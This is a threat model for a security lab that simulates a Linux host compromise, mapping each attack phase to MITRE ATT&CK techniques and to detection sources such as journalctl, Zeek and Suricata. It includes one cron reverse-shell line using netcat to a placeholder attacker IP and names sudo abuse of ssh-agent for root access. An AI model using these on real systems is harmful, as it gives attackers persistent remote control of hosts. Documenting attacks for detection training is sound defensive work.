# Threat Model

## Overview

This project simulates the complete lifecycle of a Linux host compromise from both offensive and defensive perspectives.

The threat model defines the assumed attacker objectives, expected behaviors, attack techniques, and available detection opportunities throughout the simulated incident.

The goal is to demonstrate the progression of a security incident:

```
Reconnaissance
      |
      v
Initial Access
      |
      v
Privilege Escalation
      |
      v
Persistence
      |
      v
Data Collection
      |
      v
Exfiltration
      |
      v
Detection and Response
```

---

# Threat Actor Profile

## Assumed Attacker

The simulated attacker represents an external threat actor attempting to compromise a Linux system.

The attacker is assumed to have:

- No initial access to the target machine
- Access to common penetration testing tools
- Ability to perform network reconnaissance
- Ability to conduct credential attacks
- Ability to execute commands after obtaining access

The attacker follows a realistic intrusion lifecycle:

1. Identify exposed services
2. Obtain valid credentials
3. Escalate privileges
4. Access sensitive information
5. Establish persistence
6. Attempt data exfiltration

---

# Attacker Objectives

## 1. Gain Initial Access

The first objective is to obtain unauthorized access to the target system.

### Simulated Activity

- Network reconnaissance
- SSH service identification
- Credential brute-force attack
- Valid account authentication

### Expected Evidence

- Packet captures
- SSH authentication logs collected through journalctl
- Successful login records

### MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Brute Force: Password Guessing | T1110.001 |
| Valid Accounts | T1078 |

---

## 2. Enumerate the Host

After gaining access, the attacker performs local discovery to understand the compromised environment.

### Simulated Activity

- Checking user privileges
- Identifying available sudo permissions
- Locating sensitive files
- Reviewing system information

### Expected Evidence

- Shell command history
- Process listings
- Journal logs
- System snapshots

### MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Process Discovery | T1057 |
| System Information Discovery | T1082 |
| Account Discovery | T1087 |

---

## 3. Escalate Privileges

The attacker attempts to move from a low-privileged account to administrative access.

### Simulated Activity

A misconfigured sudo permission allowed abuse of:

```
/usr/bin/ssh-agent
```

This was leveraged through a GTFOBins technique to obtain a root shell.

### Expected Evidence

- Process activity
- Command execution history
- System logs

### MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Abuse Elevation Control Mechanism | T1548 |

---

## 4. Establish Persistence

The attacker attempts to maintain access after the initial compromise.

### Simulated Activity

A cron-based reverse shell was configured:

```
* * * * * nc -e /bin/sh <attacker-ip> 12345
```

### Expected Evidence

- Cron configuration changes
- Suspicious network activity
- Process execution artifacts

### MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Scheduled Task/Job: Cron | T1053.003 |

---

## 5. Collect and Exfiltrate Data

The attacker searches for valuable information and simulates removing it from the compromised system.

### Simulated Activity

- Accessing sensitive files
- Compressing sensitive data
- Transferring data using Netcat

### Expected Evidence

- Process activity
- Network captures
- File system changes

### MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Data from Local System | T1005 |
| Exfiltration Over C2 Channel | T1041 |

---

# Threat Model Table

| Attack Phase | Objective | Technique | Detection Sources |
|---|---|---|---|
| Reconnaissance | Identify exposed services | Network scanning | PCAP, Suricata |
| Initial Access | Obtain credentials | SSH brute force | SSH logs, PCAP |
| Account Access | Authenticate using stolen credentials | Valid Accounts | journalctl SSH logs |
| Privilege Escalation | Obtain root access | Sudo abuse | Process logs, system logs |
| Persistence | Maintain access | Cron job | Cron configuration |
| Data Collection | Locate sensitive information | Local file access | File system activity |
| Exfiltration | Transfer collected data | Network transfer | PCAP, Zeek |

---

# MITRE ATT&CK Matrix

| Tactic | Technique | ID | Simulation |
|---|---|---|---|
| Reconnaissance | Network Service Scanning | T1046 | Nmap scanning |
| Initial Access | Brute Force | T1110 | Hydra SSH attack |
| Initial Access | Valid Accounts | T1078 | SSH login |
| Discovery | Process Discovery | T1057 | Host enumeration |
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 | Sudo abuse |
| Persistence | Scheduled Task/Job: Cron | T1053.003 | Reverse shell cron job |
| Collection | Data from Local System | T1005 | Sensitive archive access |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | Netcat transfer |

---

# Expected Detection Opportunities

| Tool / Source | Visibility Provided |
|---|---|
| journalctl | SSH authentication and system events |
| SSH logs | Login attempts and successful authentication |
| tcpdump | Full network packet capture |
| Wireshark | Network investigation |
| Suricata | Network-based detection |
| Zeek | Connection metadata analysis |
| Process snapshots | Host activity investigation |

This threat model establishes the expected attacker behavior and provides the foundation for later detection and response analysis.